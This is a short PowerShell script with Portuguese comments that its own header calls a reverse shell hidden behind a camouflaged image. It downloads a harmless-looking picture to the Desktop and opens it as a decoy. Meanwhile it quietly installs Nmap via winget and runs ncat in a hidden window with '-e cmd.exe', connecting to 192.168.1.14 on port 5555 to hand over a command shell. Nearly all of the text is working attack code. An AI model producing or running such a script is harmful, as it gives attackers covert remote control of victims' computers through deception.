#ESSE É ARQUIVO REVERSE SHELL UTILIZANDO UMA EXTENÇÃO POWERSHELL E UMA IMAGEM CAMUFLADA COM UM SCRIPT DE FUNDO

# DEFINE O DIRETÓRIO DO DESKTOP
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)

# DEFINE O URL E O CAMINHO DO ARQUIVO DE IMAGEM
$url2 = "https://www.minitool.com/images/uploads/news/2020/04/system-error-codes-fixes/system-error-codes-fixes-thumbnail.png"
$filename2 = "picture15322.jpg"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2

# DOWNLOAD A IMAGEM
Invoke-WebRequest -Uri $url2 -OutFile $finalPath2

# ABRE A IMAGEM
Start-Process $finalPath2
# INSTALA O NCAT USANDO O WINGET
winget install Insecure.Nmap

# AGUARDA A INSTALAÇÃO COMPLETA (OPCIONAL)
Start-Sleep -Seconds 15



# DEFINE OS PARÂMETROS PARA O NCAT
$params = "192.168.1.14 5555 -e cmd.exe"

# EXECUTA O NCAT COM OS PARÂMETROS
Start-Process -FilePath "ncat" -ArgumentList $params -WindowStyle Hidden
